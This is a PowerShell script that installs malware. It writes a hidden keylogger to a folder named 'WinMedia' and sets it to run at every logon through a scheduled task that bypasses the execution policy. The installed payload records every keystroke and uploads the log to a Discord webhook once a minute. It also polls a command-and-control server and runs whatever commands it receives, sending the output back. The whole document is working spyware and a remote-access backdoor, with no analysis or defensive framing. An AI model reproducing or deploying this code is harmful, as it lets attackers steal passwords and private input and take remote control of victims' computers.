param([string]$PCName, [string]$WebhookUrl, [string]$C2Url)

# 1. Establish secure, dedicated working directory
$dir = "$env:LOCALAPPDATA\WinMedia"
if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }

$logFile = "$dir\data.txt"
$scriptPath = "$dir\winlog.ps1"

# 2. Build the operational loop script block verbatim
$payloadContent = @"
# Global session variables passed from compiler layer
$`PCName     = '$PCName'
$`WebhookUrl = '$WebhookUrl'
$`C2Url      = '$C2Url'
$`logFile    = '$logFile'

# Ensure the log file exists immediately to prevent pointer errors
if (!(Test-Path $`logFile)) { New-Item $`logFile -Type File | Out-Null }

# Re-verify user32.dll loading logic for non-interactive hidden desktop execution contexts
try {
    `$Signature = '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);'
    Add-Type -TypeDefinition "using System.Runtime.InteropServices; public class KeyEngine { `$Signature }" -ErrorAction SilentlyContinue
} catch {}

# Thread-safe execution intervals tracking counters
`$c2Interval      = 0
`$discordInterval = 0

# Set a standard User-Agent header to bypass basic web firewalls / cloud protection
`$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }

while (`$true) {
    # ================= ENGINE A: NATIVE WIN32 KEYLOGGER =================
    # Scan standard ASCII virtual key ranges safely
    for (`$i = 8; `$i -le 190; `$i++) {
        if ([KeyEngine]::GetAsyncKeyState(`$i) -eq -32767) {
            `$char = [char]`$i
            if (`$i -eq 13) { `$char = [char]10 } # Line break on Enter
            if (`$i -eq 32) { `$char = " " }      # Spacebar stabilization
            
            # Keep logging functional regardless of file system locks
            try {
                "`$char" | Out-File `$logFile -Append -NoNewline -ErrorAction SilentlyContinue
            } catch {}
        }
    }

    # ================= ENGINE B: REMOTE COMMAND POLLING (Every 5 Seconds) =================
    if (`$c2Interval -ge 500) {
        try {
            `$targetUrl = "`$(${C2Url})/get_cmd?id=`$(${PCName})"
            `$cmdResponse = Invoke-RestMethod -Uri `$targetUrl -Method Get -Headers `$headers -TimeoutSec 5
            
            if (`$cmdResponse -and `$cmdResponse -ne 'wait') {
                # Execute command natively and capture standard error channels 
                `$output = (Invoke-Expression `$cmdResponse 2>&1 | Out-String)
                if (!`$output) { `$output = 'Command executed with no return data.' }
                
                `$postUrl = "`$(${C2Url})/send_res?id=`$(${PCName})"
                Invoke-RestMethod -Uri `$postUrl -Method Post -Body @{ output = `$output } -Headers `$headers -TimeoutSec 5 | Out-Null
            }
        } catch {}
        `$c2Interval = 0
    }

    # ================= ENGINE C: DISCORD EXFILTRATION (Every 60 Seconds) =================
    if (`$discordInterval -ge 6000) {
        if (Test-Path `$logFile) {
            if ((Get-Item `$logFile).Length -gt 0) {
                try {
                    `$timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
                    `$fileName = "`$(${PCName})_`$(${timestamp}).txt"
                    
                    # Package and transmit data safely
                    Invoke-RestMethod -Uri `$WebhookUrl -Method Post -Form @{ file = Get-Item `$logFile; filename = `$fileName } -TimeoutSec 10 | Out-Null
                    Clear-Content `$logFile -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        `$discordInterval = 0
    }

    # High-precision cycle step loops (10ms tick speed matches standard microcontrollers)
    Start-Sleep -m 10
    `$c2Interval += 10
    `$discordInterval += 10
}
"@

# 3. Save payload cleanly to the local directory without dynamic array corruptions
Set-Content -Path $scriptPath -Value $payloadContent -Force

# 4. Wipe out any older broken task profiles cleanly
schtasks /delete /tn 'WinMediaLog' /f 2>&1 | Out-Null

# 5. Register the new execution task using Bypass parameters natively matching Task Scheduler standards
schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onlogon

# 6. Kickstart execution instantly for this active setup session
schtasks /run /tn 'WinMediaLog'
